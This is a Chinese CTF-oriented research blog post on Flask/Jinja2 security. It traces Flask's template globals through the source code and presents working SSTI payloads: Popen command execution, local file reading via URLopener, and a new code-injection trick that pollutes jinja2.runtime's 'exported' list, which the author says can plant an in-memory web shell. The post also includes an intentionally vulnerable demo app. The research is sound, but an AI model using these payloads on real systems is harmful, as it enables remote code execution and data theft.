---
title: Flask的安全研究
description: 对CTF中基于Flask框架的研究
author: lamaper
date: 2025-11-03 23:37:21 +0800
categories: [Cyber Security]
tags: [ctf, web, python, flask, jinja2, SSTI, sandbox esc]
math: true
mermaid: true
toc: true
render_with_liquid: true
image:
  path: https://cache.yisu.com/upload/information/20200622/113/42070.png
---
{% raw %}
# Flask框架的安全研究

Flask是一个使用Python编写的轻量级Web应用框架，被称为“微框架”。它的核心简单且可扩展，通过扩展可以增加其他功能。Flask基于Werkzeug WSGI工具包和Jinja2模板引擎。其中`Werkzeug` 是一个 WSGI 工具包，用于处理 HTTP 请求和响应。`Jinja2` 是一个灵活的模板引擎，用于生成动态 HTML 页面。

这是flask的用例图：

{% endraw %}

<img src="{{ '/assets/img/post/2025-11-03-flask-01.png' | relative_url }}" alt="alt">

{% raw %}

## 框架概述

### 模版引擎

在Web开发的世界里，将动态内容融入静态页面是一项常见需求。Jinja2，作为一个强大的Python模板引擎，正是为了解决这一问题而生。Flask框架采用Jinja2模板引擎来动态渲染Python的模版引擎大多采用相同的语法结构，`{% ... %}` 和 `{{ ... }}` 。前者用于执行诸如 for 循环或赋值的语句，后者把表达式的结果打印到模板上。

### 全局对象

在./flask/app.py中的`class Flask(App)`中，定义了`create_jinja_environment`：

```python
    def create_jinja_environment(self) -> Environment:
        """Create the Jinja environment based on :attr:`jinja_options`
        and the various Jinja-related methods of the app. Changing
        :attr:`jinja_options` after this will have no effect. Also adds
        Flask-related globals and filters to the environment.

        .. versionchanged:: 0.11
           ``Environment.auto_reload`` set in accordance with
           ``TEMPLATES_AUTO_RELOAD`` configuration option.

        .. versionadded:: 0.5
        """
        options = dict(self.jinja_options)

        if "autoescape" not in options:
            options["autoescape"] = self.select_jinja_autoescape

        if "auto_reload" not in options:
            auto_reload = self.config["TEMPLATES_AUTO_RELOAD"]

            if auto_reload is None:
                auto_reload = self.debug

            options["auto_reload"] = auto_reload

        rv = self.jinja_environment(self, **options)
        rv.globals.update(
            url_for=self.url_for,
            get_flashed_messages=get_flashed_messages,
            config=self.config,
            # request, session and g are normally added with the
            # context processor for efficiency reasons but for imported
            # templates we also want the proxies in there.
            request=request,
            session=session,
            g=g,
        )
        rv.policies["json.dumps_function"] = self.json.dumps
        return rv
```

`rv = self.jinja_environment(self, **options)`返回了一个Jinja2的`<class 'Environment'>`的对象。这个类在./jinja2/environment.py中被定义，我们接着往下看，发现`rv.globals`，这是对象的属性，通过类型推断我们可以知道这是一个字典，在`<class 'Environment'>`的`__init__`函数中，可以看到：

```python
self.globals = DEFAULT_NAMESPACE.copy()
```

其中`DEFAULT_NAMESPACE`来自于./jinja2/defaults.py，在这里可以发现jinja2内置的全局对象：

```python
# default filters, tests and namespace
DEFAULT_NAMESPACE = {
    "range": range,
    "dict": dict,
    "lipsum": generate_lorem_ipsum,
    "cycler": Cycler,
    "joiner": Joiner,
    "namespace": Namespace,
}
```

出现了非常常用的函数`lipsum`。接着往下看update的内置，这就是Flask框架自己新引入的默认命名空间中的全局对象。

```python
    def from_string(
        self,
        source: t.Union[str, nodes.Template],
        globals: t.Optional[t.MutableMapping[str, t.Any]] = None,
        template_class: t.Optional[t.Type["Template"]] = None,
    ) -> "Template":
        """Load a template from a source string without using
        :attr:`loader`.

        :param source: Jinja source to compile into a template.
        :param globals: Extend the environment :attr:`globals` with
            these extra variables available for all renders of this
            template. If the template has already been loaded and
            cached, its globals are updated with any new items.
        :param template_class: Return an instance of this
            :class:`Template` class.
        """
        gs = self.make_globals(globals)
        cls = template_class or self.template_class
        return cls.from_code(self, self.compile(source), gs, None)
```

所以当我们编写一个十分简单的具有SSTI漏洞的Flask程序时：

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def hello_world():  # put application's code here
    person = 'lmpr'
    if request.args.get('name'):
        person = request.args.get('name')
    template = '<h1>Hi, %s.</h1>' % person
    return render_template_string(template)

if __name__ == '__main__':
    app.run()
    print("=== Flask 暴露的全局变量 ===")
    for key in app.jinja_env.globals.keys():
        print(f"{key}: {type(app.jinja_env.globals[key])}")
```

可以得到控制台输出：

```
#From jinja2
range: <class 'type'>
dict: <class 'type'>
lipsum: <class 'function'>
cycler: <class 'type'>
joiner: <class 'type'>
namespace: <class 'type'>

#From Flask
url_for: <class 'method'>
get_flashed_messages: <class 'function'>
config: <class 'flask.config.Config'>
request: <class 'werkzeug.local.LocalProxy'>
session: <class 'werkzeug.local.LocalProxy'>
g: <class 'werkzeug.local.LocalProxy'>
```

这就是Flask中暴露的全局对象。十分特殊的就是`lipsum`、`url_for`、`get_flashed_messages`，这三个对象都是函数对象。准确来说，python中区分function和method的方法是看这个函数是否是某个类的内置函数，python认为类的内置函数为method。这并不影响我们利用函数的默认魔术属性`__globals__`以获取程序中的全局对象。

<div class="mermaid">
graph TB
    %% Jinja2 环境部分
    subgraph "Jinja2 Environment (app.jinja_env)"
        A[app.jinja_env.globals] --> A1["lipsum: function"]
        A --> A2["range: type"] 
        A --> A3["dict: type"]
        A --> A4["cycler: type"]
        A --> A5["config: werkzeug.local.LocalProxy"]
        A --> A6["request: werkzeug.local.LocalProxy"]
        
        A1 --> A1_1["lipsum函数对象"]
    end
    
    %% lipsum 函数本身的全局命名空间
    subgraph "lipsum 函数的 __globals__"
        B[lipsum.__globals__] --> B1["__name__: '__main__'"]
        B --> B2["__builtins__: module"]
        B --> B3["os"]
        B --> B4["其他模块级变量"]
        B --> B5["lipsum函数定义时的环境变量"]
    end
    
    %% Python 内置命名空间
    subgraph "Python Built-in 命名空间"
        C[__builtins__] --> C1["len: function"]
        C --> C2["其他"]
        C --> C3["eval"]
        C --> C4["range: class"]
    end
    
    subgraph "OS 命名空间"
        D[os] --> D1["popen"]
        D --> D2["其他"]
    end
    
    %% 关系连接
    A1_1 --> B
    B2 --> C
    B3 --> D
    
    %% 样式定义
    classDef env fill:#e1f5fe,stroke:#01579b,stroke-width:2px
    classDef func fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    classDef builtin fill:#e8f5e8,stroke:#1b5e20,stroke-width:2px
    
    class A,A1,A2,A3,A4,A5,A6 env
    class A1_1,B func
    class C,C1,C2,C3,C4 builtin
</div>

十分特别、与我们平常习惯不同地，`range`是类而不是函数，这点需要注意。

#### `g`、`session`、`request`

在来看看三个比较特殊的对象`g`、`session`、`request`，在./flask/globals.py中有它们的定义：

```python
g: _AppCtxGlobals = LocalProxy(  # type: ignore[assignment]
    _cv_app, "g", unbound_message=_no_app_msg
)
request: Request = LocalProxy(  # type: ignore[assignment]
    _cv_request, "request", unbound_message=_no_req_msg
)
session: SessionMixin = LocalProxy(  # type: ignore[assignment]
    _cv_request, "session", unbound_message=_no_req_msg
)
```

这段代码是Flask框架中实现请求上下文(request context)和线程局部变量(thread-local)的关键部分。`LocalProxy`是Werkzeug库中的一个类，用于创建代理对象。代理对象会转发所有操作到目标对象。但是，`LocalProxy`的特殊之处在于它不会在创建时固定代理哪个对象，而是每次都会从当前线程的局部存储或类似的上下文中获取目标对象。`_cv_request`是一个上下文变量，它存储了当前请求的上下文信息。在Flask中，每个请求都有独立的上下文，因此`_cv_request`会保存当前请求的`Request`对象。具体来说：

```python
session: SessionMixin = LocalProxy(...)
```

这段代码表明了`session`（变量名）的类型是`SessionMixin`，但是实例化的时候被当做`LocalProxy`进行实例化。这是一个没有“继承”的面向对象多态特性。但这并不妨碍`session`具备`SessionMixin`的属性。

在./flask/sessions.py中可以看见`session`的定义：

```python
class SessionMixin(MutableMapping[str, t.Any]):
    """Expands a basic dictionary with session attributes."""
```

`MutableMapping[str, t.Any]`是一个类型注解它表示一个可变的映射，其中键（key）的类型是字符串类型（str），而值（value）的类型可以是任意类型（t.Any）。

在python的lib中我们可以看到`MutableMapping`的实现，它包含了几个新的方法：`pop`、`popitem`、`clear`、`update`。也就是说我们可以通过`session.update()`为session添加键值对。

按照同样的方法我们可以知道`request`是./werkzeug/sansio/request.py中`Request`类的子类的实例。`g`是./flask/ctx.py中`_AppCtxGlobals`类的实例。

在Python中，每个函数/方法都具有`__globals__`魔术属性，它介绍了函数的全局空间。这个全局空间的范围是当前模块（也就是一个xxx.py文件）中所有的类、变量、函数。一个例子：

```python
# module.py
MODULE_VAR = "模块变量"

class ClassA:
    CLASS_VAR = "A类的变量"
    
    def method_a(self):
        return "A的方法"

class ClassB:
    def method_b(self):
        # 查看 __globals__
        globals_dict = method_b.__globals__
        print("ClassB.method_b 的 __globals__ 键:")
        for key in sorted(globals_dict.keys()):
            if not key.startswith('__'):  # 过滤内置变量
                print(f"  {key}")

obj_b = ClassB()
obj_b.method_b()
```

它的输出是：

```
ClassB.method_b 的 __globals__ 键:
  MODULE_VAR
  ClassA
  ClassB
```

这非常明显地给出了我们构造payload的方法，就是找到一个类/函数，其所在的模块中直接或者间接的引入的某些可以被利用的模块或函数，如`os`模块。除此之外需要注意的是，**有装饰器的函数确实在访问 `__globals__`时会遇到问题**。这是因为装饰器改变了函数的身份和属性访问方式。Python中装饰器的原理是：

```python
def my_decorator(func):
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs)
    return wrapper

@my_decorator
def my_function():
    return "hello"

# 实际上相当于：
# my_function = my_decorator(my_function)
```

对于有装饰器的函数，多数情况下无法获取其globals属性。

#### `config`

config的定义在./flask/sansio/app.py中，当调用App的`__init__()`方法时，会调用同一个类中`make_config()`方法，该方法返回一个`Config`类型对象。在./flask/config.py中可以看到它的定义：

```python
class Config(dict):  # type: ignore[type-arg]
```


和上面所说不同地，Config直接继承自dict这一Python内置数据类型，说明Config本身就是一个增强版dict。同时有一个令人惊喜的发现，在这个模块中，显式地引入了`os`模块，并且类内方法没有被装饰器修饰，所以我们可以使用下列方法去获取Popen函数：

```jinja2
{{config.__init__.__globals__}}
{{config.from_envvar.__globals__}}
{{config.from_prefixed_env.__globals__}}
{{config.from_pyfile.__globals__}}
{{config.from_file.__globals__}}
{{config.from_mapping.__globals__}}
{{config.get_namespace.__globals__}}
```

#### `Cycler`、`joiner`、`Namespace`

这三个类的定义都在./jinja2/utils.py，显而易见地全局引入了os模块，所以可以用常规方式获取popen函数，这里不再赘述。

#### `range`、`dict`

这两个类直接来自于Python builtins模块，所以利用链比较常规

## SSTI

在前文《Python SSTI研究》中已经有较为系统的介绍，这里写一些利用思路。

为了研究Flask的其他利用链，我采用了PyCharm对代码进行动态调试（这不是重点）。重点是我发现Windows下和Linux下Object类的子类不完全一样，例如《Python SSTI研究》一文中我提到subclass中可能含有`Popen(subprocess)`这个类，当时是在WSL2 Ubuntu24.04下实现的；编写本文时，我在windows环境下却发现没有这一类。所以构造Payload必须具体问题具体分析。

很多情况下我们都依赖`__globals__`获取函数，但是有没有不依赖`__globals__`的方法呢？

我想到的是利用类本身的特性去实现。

### subprocess.Popen

在《Python SSTI研究》一文中我提到过这个操作，通过实例化`Popen`类产生一个临时对象，调用它使其执行风险命令：

```jinja2
{{''.__class__.__bases__[0].__subclasses__()[535]('ls', shell=True, stdout=-1).communicate()[0]}}
```

这里不再赘述。

### urllib.request.URLopener

很多时候我们没有那么多需求，只需要读到某些文件即可，所以不一定非要找到popen或者eval，open或者read也是不错的选择。

我们可以利用urllib.request.URLopener。首先常规地获得它的类，查看一下它的方法：

```jinja2
{{range.__class__.__base__.__subclasses__()[346].__dict__}}
```

有回显：

```
{'__module__': 'urllib.request', '__doc__': "Class to open URLs.\n This is a class rather than just a subroutine because we may need\n more than one set of global protocol-specific options.\n Note -- this is a base class for those who don't want the\n automatic handling of errors type 302 (relocated) and 401\n (authorization needed).", '_URLopener__tempfiles': None, 'version': 'Python-urllib/3.12', '__init__': <function URLopener.__init__ at 0x000001D130AA39C0>, '__del__': <function URLopener.__del__ at 0x000001D130AA3BA0>, 'close': <function URLopener.close at 0x000001D130AA3C40>, 'cleanup': <function URLopener.cleanup at 0x000001D130AA3CE0>, 'addheader': <function URLopener.addheader at 0x000001D130AA3D80>, 'open': <function URLopener.open at 0x000001D130AA3E20>, 'open_unknown': <function URLopener.open_unknown at 0x000001D130AA3EC0>, 'open_unknown_proxy': <function URLopener.open_unknown_proxy at 0x000001D130AA3F60>, 'retrieve': <function URLopener.retrieve at 0x000001D130AA4040>, '_open_generic_http': <function URLopener._open_generic_http at 0x000001D130AA40E0>, 'open_http': <function URLopener.open_http at 0x000001D130AA4180>, 'http_error': <function URLopener.http_error at 0x000001D130AA4220>, 'http_error_default': <function URLopener.http_error_default at 0x000001D130AA42C0>, '_https_connection': <function URLopener._https_connection at 0x000001D130AA4360>, 'open_https': <function URLopener.open_https at 0x000001D130AA4400>, 'open_file': <function URLopener.open_file at 0x000001D130AA44A0>, 'open_local_file': <function URLopener.open_local_file at 0x000001D130AA4540>, 'open_ftp': <function URLopener.open_ftp at 0x000001D130AA45E0>, 'open_data': <function URLopener.open_data at 0x000001D130AA4680>, '__dict__': <attribute '__dict__' of 'URLopener' objects>, '__weakref__': <attribute '__weakref__' of 'URLopener' objects>}.
```

这令我们很兴奋，因为这里出现了很多可以读文件的函数，我们先选择`open`，实例化类以后直接调用（注意需要用到伪协议）：

```jinja2
{{range.__class__.__base__.__subclasses__()[346]().open("file:///D:/flag.txt").read()}}
```

成功得到回显。说明这个思路是正确的。触类旁通，如果我们选择`open_local_file`就不需要伪协议：

```jinja2
{{range.__class__.__base__.__subclasses__()[346]().open_local_file("D:/flag.txt").read()}}
```

"*;print(114514);#"

.append('*;print(114514);from jinja2.runtime import new_context')

## 全局变量污染

在https://tttang.com/archive/1876一文中，[Article_kelp](https://tttang.com/user/Article_kelp)师傅指出：

> 在`flask`中如使用`render_template`渲染一个模板实际上经历了多个阶段的处理，其中一个阶段是对模板中的`Jinja`语法进行解析转化为`AST`，而在语法树的根部即`Lib/site-packages/jinja2/compiler.py`中`CodeGenerator`类的`visit_Template`方法纯在一段有趣的逻辑

![](https://storage.tttang.com/media/attachment/2023/01/27/d0ca1c4c-ca76-41e3-b982-625dde1a9124.png)

在这篇文章中，师傅认为可以通过原型链污染`exported`和`async_exported`来进行恶意语句拼接。

本文基于此产生了另外的想法：

首先我们在Object的子类中就可以找到JInja2.runtime的子类：

```
506: TemplateReference (jinja2.runtime)
507: Context (jinja2.runtime)
508: BlockReference (jinja2.runtime)
509: LoopContext (jinja2.runtime)
510: Macro (jinja2.runtime)
511: Undefined (jinja2.runtime)
```

我们通过SSTI任取其中一个类，找到其中一个没有修饰器的普通方法获取其`__globals__`属性，就可以得到全局：

```
{{range.__class__.__base__.__subclasses__()[507].keys.__globals__}}
```

```
 ... 
 'V': ~V, 'F': ~F, 'exported': ['LoopContext', 'TemplateReference', 'Macro', 'Markup', 'TemplateRuntimeError', 'missing', 'escape', 'markup_join', 'str_join', 'identity', 'TemplateNotFound', 'Namespace', 'Undefined', 'internalcode', '*;print(114514);from jinja2.runtime import new_context'], 'async_exported': ['AsyncLoopContext', 'auto_aiter', 'auto_await'], 
 ...
```

那么回到源码中，在./jinja2/runtime.py中可以看到：

```python
# these variables are exported to the template runtime
exported = [
    "LoopContext",
    "TemplateReference",
    "Macro",
    "Markup",
    "TemplateRuntimeError",
    "missing",
    "escape",
    "markup_join",
    "str_join",
    "identity",
    "TemplateNotFound",
    "Namespace",
    "Undefined",
    "internalcode",
]
async_exported = [
    "AsyncLoopContext",
    "auto_aiter",
    "auto_await",
]
```

这是一个十分朴素的数组，没有任何特殊的功能，意味着我们可以通过更加朴素的方法去往里面追加东西。

构造payload尝试：

```
{{range.__class__.__base__.__subclasses__()[507].keys.__globals__.exported.append('*;')}}
```

查看控制台：

```
 * Serving Flask app 'app'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
127.0.0.1 - - [04/Nov/2025 11:11:49] "GET /?name={{range.__class__.__base__.__subclasses__()[507].keys.__globals__.exported.append('*;')}} HTTP/1.1" 200 -
[2025-11-04 11:11:52,017] ERROR in app: Exception on / [GET]
Traceback (most recent call last):
  File "E:\ProgramFile\Python\Python312\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\ProgramFile\Python\Python312\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\ProgramFile\Python\Python312\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\ProgramFile\Python\Python312\Lib\site-packages\flask\app.py", line 902, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\ctfTools\CtfLab\PyTrojan\app.py", line 12, in hello_world
    return render_template_string(template)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\ProgramFile\Python\Python312\Lib\site-packages\flask\templating.py", line 161, in render_template_string
    template = app.jinja_env.from_string(source)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\ProgramFile\Python\Python312\Lib\site-packages\jinja2\environment.py", line 1111, in from_string
    return cls.from_code(self, self.compile(source), gs, None)
                               ^^^^^^^^^^^^^^^^^^^^
  File "E:\ProgramFile\Python\Python312\Lib\site-packages\jinja2\environment.py", line 769, in compile
    return self._compile(source, filename)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\ProgramFile\Python\Python312\Lib\site-packages\jinja2\environment.py", line 709, in _compile
    return compile(source, filename, "exec")
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<template>", line 1
    from jinja2.runtime import *;, LoopContext, Macro, Markup, Namespace, TemplateNotFound, TemplateReference, TemplateRuntimeError, Undefined, escape, identity, internalcode, markup_join, missing, str_join
                                 ^
SyntaxError: invalid syntax
127.0.0.1 - - [04/Nov/2025 11:11:52] "GET /?name={{range.__class__.__base__.__subclasses__()[507].keys.__globals__.exported.append('*;')}} HTTP/1.1" 500 -

```

我们得到了想要的结果：

```
File "<template>", line 1
    from jinja2.runtime import *;, LoopContext, Macro, Markup, Namespace, TemplateNotFound, TemplateReference, TemplateRuntimeError, Undefined, escape, identity, internalcode, markup_join, missing, str_join
```

很显然这里存在这动态渲染拼接，所以接下来尝试构造：

```
{{range.__class__.__base__.__subclasses__()[507].keys.__globals__.exported.append('*;print(114514);from jinja2.runtime import new_context')}}
```

其中new_context是原来exported中不存在的项。这里曾尝试过使用#对后面进行注释，但是发生了报错，具体原因没有研究清楚。

执行这个语句后我们可以看到控制台：

![image-20251104111438175](/assets/img/post/image-20251104111438175.png)

至此大功告成。基于这种方法我们可以植入内存马或进行其他风险操作。

{% endraw %}